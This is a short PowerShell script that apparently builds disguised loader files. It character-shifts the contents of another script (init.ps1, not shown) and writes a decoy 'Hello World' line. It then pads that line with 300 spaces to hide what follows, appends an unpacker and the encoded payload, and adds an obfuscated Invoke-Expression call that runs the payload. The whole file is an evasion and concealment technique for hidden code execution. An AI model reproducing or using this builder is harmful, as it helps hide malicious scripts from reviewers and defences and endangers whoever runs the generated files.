function pack() {
    $i=1
    $ofs=''
    [string[]] $($args[0] | % {$a=[char[]]$_ | % {$([char]([int]$_+$i))}; "$a";$i++})
}

function serialize() {
    $ofs=','
    return '$({0})' -f (([string[]]$args[0]) | % {"'$_'"})
    
}

function serialize_var() {
    param($name, $content)

    $ofs=''
    $out='$' + $name + ' = $('
    foreach($item in $content) {
        $out +="'$item',"
    }
    $out +="'');"
    $out
}

function gen_dload() {

}

function prepare_1() {
    $init=$(pack $(cat init.ps1).Split(' '))
    Set-Content gen/1.ps1 "Write-Output 'Hello World';" -NoNewline -Encoding Unicode
    Add-Content gen/1.ps1 (' '*300) -NoNewline
    (cat unpack.ps1) -join '' | Add-Content gen/1.ps1
    serialize_var i $init >> gen/1.ps1
    '$c = $(u {0}).Trim();' -f $(serialize $(pack $("Invoke-Expression"))) >> gen/1.ps1
    echo '&$c $(u $i)' >> gen/1.ps1


    .\gen\1.ps1
}

function prepare_2() {
    cat unpack.ps1 > gen/2.ps1
    cat init.ps1 >> gen/2.ps1

    cat gen/2.ps1
    echo =================
    .\gen\2.ps1
}

prepare_1